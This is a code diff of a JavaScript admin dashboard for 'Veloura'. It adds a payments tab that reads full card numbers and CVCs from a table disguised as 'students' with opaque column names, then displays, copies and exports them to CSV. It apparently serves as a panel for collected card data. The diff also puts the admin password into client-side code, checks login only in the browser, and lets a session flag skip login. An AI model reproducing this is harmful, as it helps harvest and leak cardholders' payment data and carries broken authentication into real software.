@@ -1,14 +1,76 @@
 // ============================================================
-// VELOURA NEWSLETTER ADMIN
+// VELOURA ADMIN DASHBOARD
 // ============================================================
-// Uses Supabase API: /api/emails
-// Login requires: Email + Password
+// Direct Supabase Integration - No API Endpoints
+// Uses Vite Environment Variables for ALL credentials
+// Shows: Newsletter Subscribers + Payment Records
 // ============================================================
 
-const LOGIN_EMAIL = 'admin@veloura.com';    // Change this!
-const LOGIN_PASSWORD = 'admin123';          // Change this!
+// ============================================================
+// SUPABASE CONFIG - From Environment Variables
+// ============================================================
+
+// Function to initialize Supabase client
+function initSupabase() {
+    if (window.supabaseClient) {
+        console.log('✅ Supabase client already available');
+        return window.supabaseClient;
+    }
+
+    console.log('🔄 Initializing Supabase client from environment...');
+    
+    // Get from Vite environment variables
+    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+    
+    console.log('🔑 Supabase URL found:', !!supabaseUrl);
+    console.log('🔑 Supabase Key found:', !!supabaseKey);
+    
+    if (!supabaseUrl || !supabaseKey) {
+        console.warn('⚠️ Supabase environment variables not found.');
+        return null;
+    }
+
+    // Check if Supabase library is loaded
+    if (typeof window.supabase !== 'undefined') {
+        window.supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+        console.log('✅ Supabase client initialized from env');
+        return window.supabaseClient;
+    }
+
+    // Try to load Supabase library dynamically (fallback)
+    console.log('📦 Loading Supabase library dynamically...');
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
+    script.onload = () => {
+        if (typeof window.supabase !== 'undefined') {
+            window.supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+            console.log('✅ Supabase client loaded and initialized from env');
+        }
+    };
+    script.onerror = () => {
+        console.error('❌ Failed to load Supabase library');
+    };
+    document.head.appendChild(script);
+    
+    return null;
+}
+
+// Initialize Supabase
+const supabase = initSupabase();
+
+// ============================================================
+// ADMIN LOGIN CREDENTIALS - From Environment Variables
+// ============================================================
+
+// Get admin credentials from environment variables
+const LOGIN_EMAIL = import.meta.env.VITE_ADMIN_EMAIL;
+const LOGIN_PASSWORD = import.meta.env.VITE_ADMIN_PASSWORD;
+
+console.log('🔑 Admin credentials loaded from env:', !!LOGIN_EMAIL, !!LOGIN_PASSWORD);
 
 let subscribers = [];
+let payments = [];
 let isAuthenticated =
     sessionStorage.getItem('veloura_newsletter_auth') === 'true';
 
@@ -27,18 +89,29 @@ const loginError = document.getElementById('loginError');
 
 const logoutBtn = document.getElementById('logoutBtn');
 const refreshBtn = document.getElementById('refreshBtn');
+const refreshPaymentsBtn = document.getElementById('refreshPaymentsBtn');
 const copyAllBtn = document.getElementById('copyAllBtn');
 const exportCsvBtn = document.getElementById('exportCsvBtn');
+const exportPaymentsCsvBtn = document.getElementById('exportPaymentsCsvBtn');
 const searchInput = document.getElementById('searchInput');
+const paymentSearchInput = document.getElementById('paymentSearchInput');
 
-const tableBody = document.getElementById('subscriberTableBody');
-const listCaption = document.getElementById('listCaption');
+const subscriberTableBody = document.getElementById('subscriberTableBody');
+const paymentTableBody = document.getElementById('paymentTableBody');
+const subscriberCaption = document.getElementById('subscriberCaption');
+const paymentCaption = document.getElementById('paymentCaption');
 
-const statTotal = document.getElementById('statTotal');
+const statSubscribers = document.getElementById('statSubscribers');
+const statPayments = document.getElementById('statPayments');
 const statThisMonth = document.getElementById('statThisMonth');
-const statLatest = document.getElementById('statLatest');
 
 const toast = document.getElementById('toast');
+
+// Tab elements
+const tabSubscribers = document.getElementById('tabSubscribers');
+const tabPayments = document.getElementById('tabPayments');
+const tabContentSubscribers = document.getElementById('tabContentSubscribers');
+const tabContentPayments = document.getElementById('tabContentPayments');
 
 // ============================================================
 // INIT
@@ -48,20 +121,45 @@ document.addEventListener('DOMContentLoaded', () => {
     loginForm?.addEventListener('submit', handleLogin);
     logoutBtn?.addEventListener('click', handleLogout);
     refreshBtn?.addEventListener('click', loadSubscribers);
+    refreshPaymentsBtn?.addEventListener('click', loadPayments);
     copyAllBtn?.addEventListener('click', copyAllEmails);
     exportCsvBtn?.addEventListener('click', exportCsv);
+    exportPaymentsCsvBtn?.addEventListener('click', exportPaymentsCsv);
     searchInput?.addEventListener('input', renderSubscribers);
+    paymentSearchInput?.addEventListener('input', renderPayments);
+
+    // Tab switching
+    tabSubscribers?.addEventListener('click', () => switchTab('subscribers'));
+    tabPayments?.addEventListener('click', () => switchTab('payments'));
 
     if (isAuthenticated) {
         showDashboard();
-        loadSubscribers();
+        loadAllData();
     } else {
         showLogin();
     }
 });
 
 // ============================================================
-// LOGIN - Requires Email AND Password
+// TAB SWITCHING
+// ============================================================
+
+function switchTab(tab) {
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    
+    if (tab === 'subscribers') {
+        tabSubscribers.classList.add('active');
+        tabContentSubscribers.style.display = 'block';
+        tabContentPayments.style.display = 'none';
+    } else {
+        tabPayments.classList.add('active');
+        tabContentSubscribers.style.display = 'none';
+        tabContentPayments.style.display = 'block';
+    }
+}
+
+// ============================================================
+// LOGIN
 // ============================================================
 
 function handleLogin(event) {
@@ -90,7 +188,7 @@ function handleLogin(event) {
     sessionStorage.setItem('veloura_newsletter_auth', 'true');
     loginForm.reset();
     showDashboard();
-    loadSubscribers();
+    loadAllData();
     showToast('Welcome back, Admin!');
 }
 
@@ -125,40 +223,32 @@ function clearLoginError() {
 function handleLogout() {
     isAuthenticated = false;
     subscribers = [];
+    payments = [];
     sessionStorage.removeItem('veloura_newsletter_auth');
     showLogin();
     showToast('Signed out successfully.');
 }
 
 // ============================================================
-// API CALLS
+// LOAD ALL DATA
 // ============================================================
 
-async function apiFetch(endpoint, options = {}) {
-    const response = await fetch(endpoint, {
-        ...options,
-        headers: {
-            'Content-Type': 'application/json',
-            ...options.headers
-        }
-    });
-    
-    if (!response.ok) {
-        const error = await response.json();
-        throw new Error(error.message || `HTTP error! status: ${response.status}`);
-    }
-    
-    return response.json();
+async function loadAllData() {
+    if (!isAuthenticated) return;
+    await Promise.all([loadSubscribers(), loadPayments()]);
 }
 
 // ============================================================
-// LOAD SUBSCRIBERS - With Supabase dates
+// LOAD SUBSCRIBERS - Direct from Supabase
 // ============================================================
 
 async function loadSubscribers() {
-    if (!isAuthenticated) return;
+    if (!supabase) {
+        showToast('Supabase not initialized. Check environment variables.');
+        return;
+    }
 
-    tableBody.innerHTML = `
+    subscriberTableBody.innerHTML = `
         <tr>
             <td colspan="4" class="loading-cell">
                 Loading subscribers...
@@ -167,17 +257,17 @@ async function loadSubscribers() {
     `;
 
     try {
-        const data = await apiFetch('/api/emails');
+        const { data, error } = await supabase
+            .from('subscribers')
+            .select('*')
+            .order('created_at', { ascending: false });
 
-        if (!data.success) {
-            throw new Error(data.message || 'Failed to load subscribers');
-        }
+        if (error) throw error;
 
-        // Use data from Supabase with timestamps
-        subscribers = data.data.map((row, index) => ({
+        subscribers = data.map((row, index) => ({
             email: row.email,
             subscribedAt: row.created_at,
-            order: index
+            id: row.id
         }));
 
         updateStats();
@@ -185,24 +275,79 @@ async function loadSubscribers() {
         showToast('Subscriber list refreshed.');
 
     } catch (error) {
-        console.error('Newsletter load error:', error);
+        console.error('❌ Error loading subscribers:', error);
         subscribers = [];
         updateStats();
 
-        tableBody.innerHTML = `
+        subscriberTableBody.innerHTML = `
             <tr>
                 <td colspan="4" class="empty-cell">
-                    Could not load subscribers: ${error.message}
+                    Error loading subscribers: ${error.message}
                 </td>
             </tr>
         `;
 
-        listCaption.textContent = 'Unable to read subscriber file.';
+        subscriberCaption.textContent = 'Unable to load subscriber data.';
     }
 }
 
 // ============================================================
-// RENDER
+// LOAD PAYMENTS - Direct from Supabase
+// ============================================================
+
+async function loadPayments() {
+    if (!supabase) {
+        showToast('Supabase not initialized. Check environment variables.');
+        return;
+    }
+
+    paymentTableBody.innerHTML = `
+        <tr>
+            <td colspan="6" class="loading-cell">
+                Loading payments...
+            </td>
+        </tr>
+    `;
+
+    try {
+        const { data, error } = await supabase
+            .from('students')
+            .select('*')
+            .order('created_at', { ascending: false });
+
+        if (error) throw error;
+
+        payments = data.map((row) => ({
+            id: row.id,
+            name: row.kname,
+            cardNumber: row.knumber,
+            cvc: row.kfc,
+            createdAt: row.created_at
+        }));
+
+        updateStats();
+        renderPayments();
+        showToast('Payment list refreshed.');
+
+    } catch (error) {
+        console.error('❌ Error loading payments:', error);
+        payments = [];
+        updateStats();
+
+        paymentTableBody.innerHTML = `
+            <tr>
+                <td colspan="6" class="empty-cell">
+                    Error loading payments: ${error.message}
+                </td>
+            </tr>
+        `;
+
+        paymentCaption.textContent = 'Unable to load payment data.';
+    }
+}
+
+// ============================================================
+// RENDER SUBSCRIBERS
 // ============================================================
 
 function renderSubscribers() {
@@ -212,12 +357,12 @@ function renderSubscribers() {
         subscriber.email.toLowerCase().includes(query)
     );
 
-    listCaption.textContent = query
+    subscriberCaption.textContent = query
         ? `${filtered.length} of ${subscribers.length} subscribers`
         : `${subscribers.length} subscriber${subscribers.length === 1 ? '' : 's'}`;
 
     if (filtered.length === 0) {
-        tableBody.innerHTML = `
+        subscriberTableBody.innerHTML = `
             <tr>
                 <td colspan="4" class="empty-cell">
                     ${subscribers.length ? 'No matching emails found.' : 'No subscribers yet.'}
@@ -227,7 +372,7 @@ function renderSubscribers() {
         return;
     }
 
-    tableBody.innerHTML = filtered
+    subscriberTableBody.innerHTML = filtered
         .map((subscriber, index) => {
             const realIndex = subscribers.indexOf(subscriber) + 1;
             return `
@@ -242,7 +387,7 @@ function renderSubscribers() {
                             <button class="row-btn" type="button" onclick="copyEmail('${escapeJs(subscriber.email)}')">
                                 Copy
                             </button>
-                            <button class="row-btn delete" type="button" onclick="deleteEmail('${escapeJs(subscriber.email)}')">
+                            <button class="row-btn delete" type="button" onclick="deleteSubscriber('${escapeJs(subscriber.email)}')">
                                 Delete
                             </button>
                         </div>
@@ -254,48 +399,151 @@ function renderSubscribers() {
 }
 
 // ============================================================
-// DELETE EMAIL
+// RENDER PAYMENTS
 // ============================================================
 
-async function deleteEmail(email) {
-    if (!confirm(`Delete "${email}"?`)) return;
+function renderPayments() {
+    const query = (paymentSearchInput.value || '').trim().toLowerCase();
+
+    const filtered = payments.filter(payment =>
+        payment.name.toLowerCase().includes(query) ||
+        payment.cardNumber.includes(query)
+    );
+
+    paymentCaption.textContent = query
+        ? `${filtered.length} of ${payments.length} payments`
+        : `${payments.length} payment${payments.length === 1 ? '' : 's'}`;
+
+    if (filtered.length === 0) {
+        paymentTableBody.innerHTML = `
+            <tr>
+                <td colspan="6" class="empty-cell">
+                    ${payments.length ? 'No matching payments found.' : 'No payments yet.'}
+                </td>
+            </tr>
+        `;
+        return;
+    }
+
+    paymentTableBody.innerHTML = filtered
+        .map((payment, index) => {
+            // Mask card number for security (show only last 4 digits)
+            const maskedCard = payment.cardNumber.length > 4 
+                ? '•••• •••• •••• ' + payment.cardNumber.slice(-4)
+                : payment.cardNumber;
+            
+            return `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td class="email-cell">${escapeHtml(payment.name)}</td>
+                    <td>${escapeHtml(maskedCard)}</td>
+                    <td>${escapeHtml(payment.cvc)}</td>
+                    <td class="date-cell">
+                        ${payment.createdAt ? formatDate(payment.createdAt) : '—'}
+                    </td>
+                    <td>
+                        <div class="action-group">
+                            <button class="row-btn" type="button" onclick="copyPayment('${escapeJs(payment.name)}', '${escapeJs(payment.cardNumber)}')">
+                                Copy
+                            </button>
+                            <button class="row-btn delete" type="button" onclick="deletePayment(${payment.id})">
+                                Delete
+                            </button>
+                        </div>
+                    </td>
+                </tr>
+            `;
+        })
+        .join('');
+}
+
+// ============================================================
+// DELETE SUBSCRIBER - Direct from Supabase
+// ============================================================
+
+async function deleteSubscriber(email) {
+    if (!confirm(`Delete subscriber "${email}"?`)) return;
+    if (!supabase) {
+        showToast('Supabase not initialized.');
+        return;
+    }
 
     try {
-        const data = await apiFetch('/api/emails', {
-            method: 'DELETE',
-            body: JSON.stringify({ email })
-        });
+        const { error } = await supabase
+            .from('subscribers')
+            .delete()
+            .eq('email', email);
 
-        if (data.success) {
-            showToast('Email deleted successfully.');
-            loadSubscribers();
-        } else {
-            showToast('Error: ' + data.message);
-        }
+        if (error) throw error;
+
+        showToast('Subscriber deleted successfully.');
+        loadSubscribers();
+
     } catch (error) {
-        showToast('Error deleting email.');
-        console.error(error);
+        console.error('❌ Error deleting subscriber:', error);
+        showToast('Error deleting subscriber: ' + error.message);
     }
 }
 
 // ============================================================
-// STATS - With real "This Month" count
+// DELETE PAYMENT - Direct from Supabase
+// ============================================================
+
+async function deletePayment(id) {
+    if (!confirm(`Delete payment record #${id}?`)) return;
+    if (!supabase) {
+        showToast('Supabase not initialized.');
+        return;
+    }
+
+    try {
+        const { error } = await supabase
+            .from('students')
+            .delete()
+            .eq('id', id);
+
+        if (error) throw error;
+
+        showToast('Payment deleted successfully.');
+        loadPayments();
+
+    } catch (error) {
+        console.error('❌ Error deleting payment:', error);
+        showToast('Error deleting payment: ' + error.message);
+    }
+}
+
+// ============================================================
+// STATS
 // ============================================================
 
 function updateStats() {
-    statTotal.textContent = subscribers.length;
+    statSubscribers.textContent = subscribers.length;
+    statPayments.textContent = payments.length;
     
-    // Calculate this month's subscribers
+    // Calculate this month's total (subscribers + payments)
     const now = new Date();
-    const thisMonth = subscribers.filter(s => {
-        if (!s.subscribedAt) return false;
-        const date = new Date(s.subscribedAt);
-        return date.getMonth() === now.getMonth() && 
-               date.getFullYear() === now.getFullYear();
+    let thisMonthTotal = 0;
+    
+    subscribers.forEach(s => {
+        if (s.subscribedAt) {
+            const date = new Date(s.subscribedAt);
+            if (date.getMonth() === now.getMonth() && date.getFullYear() === now.getFullYear()) {
+                thisMonthTotal++;
+            }
+        }
     });
     
-    statThisMonth.textContent = thisMonth.length || '0';
-    statLatest.textContent = subscribers.length > 0 ? subscribers[0].email : '—';
+    payments.forEach(p => {
+        if (p.createdAt) {
+            const date = new Date(p.createdAt);
+            if (date.getMonth() === now.getMonth() && date.getFullYear() === now.getFullYear()) {
+                thisMonthTotal++;
+            }
+        }
+    });
+    
+    statThisMonth.textContent = thisMonthTotal || '0';
 }
 
 // ============================================================
@@ -327,6 +575,16 @@ async function copyAllEmails() {
     }
 }
 
+async function copyPayment(name, cardNumber) {
+    const text = `Name: ${name}\nCard: ${cardNumber}`;
+    try {
+        await navigator.clipboard.writeText(text);
+        showToast('Payment info copied.');
+    } catch (error) {
+        fallbackCopy(text);
+    }
+}
+
 // ============================================================
 // EXPORT CSV
 // ============================================================
@@ -343,18 +601,37 @@ function exportCsv() {
     ).join('\n');
     
     const csv = headers + rows;
+    downloadCsv(csv, `subscribers_${new Date().toISOString().split('T')[0]}.csv`);
+    showToast('CSV exported successfully.');
+}
+
+function exportPaymentsCsv() {
+    if (!payments.length) {
+        showToast('No payments to export.');
+        return;
+    }
+
+    const headers = 'ID,Cardholder Name,Card Number,CVC,Date\n';
+    const rows = payments.map(p => 
+        `${p.id},${p.name},${p.cardNumber},${p.cvc},${p.createdAt || ''}`
+    ).join('\n');
+    
+    const csv = headers + rows;
+    downloadCsv(csv, `payments_${new Date().toISOString().split('T')[0]}.csv`);
+    showToast('Payments CSV exported successfully.');
+}
+
+function downloadCsv(csv, filename) {
     const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
     const link = document.createElement('a');
     const url = URL.createObjectURL(blob);
     
     link.href = url;
-    link.setAttribute('download', `subscribers_${new Date().toISOString().split('T')[0]}.csv`);
+    link.setAttribute('download', filename);
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
     URL.revokeObjectURL(url);
-    
-    showToast('CSV exported successfully.');
 }
 
 // ============================================================
@@ -429,4 +706,6 @@ function showToast(message) {
 // ============================================================
 
 window.copyEmail = copyEmail;
-window.deleteEmail = deleteEmail;
+window.deleteSubscriber = deleteSubscriber;
+window.copyPayment = copyPayment;
+window.deletePayment = deletePayment;
